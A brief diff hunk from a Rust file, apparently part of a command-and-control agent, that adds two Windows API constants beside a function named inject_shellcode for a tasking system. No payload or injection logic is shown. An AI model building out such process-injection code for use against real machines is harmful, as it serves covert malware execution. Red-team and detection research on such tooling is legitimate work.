@@ -46,6 +46,10 @@ const PROCESS_QUERY_INFORMATION: DWORD = 0x0400;
 const STILL_ACTIVE: DWORD = 259;
 #[cfg(target_os = "windows")]
 const INFINITE: DWORD = 0xFFFFFFFF;
+#[cfg(target_os = "windows")]
+const MEM_RELEASE: DWORD = 0x8000;
+#[cfg(target_os = "windows")]
+const WAIT_TIMEOUT: DWORD = 0x102;
 
 /// Wrapper function for compatibility with the tasking system
 pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
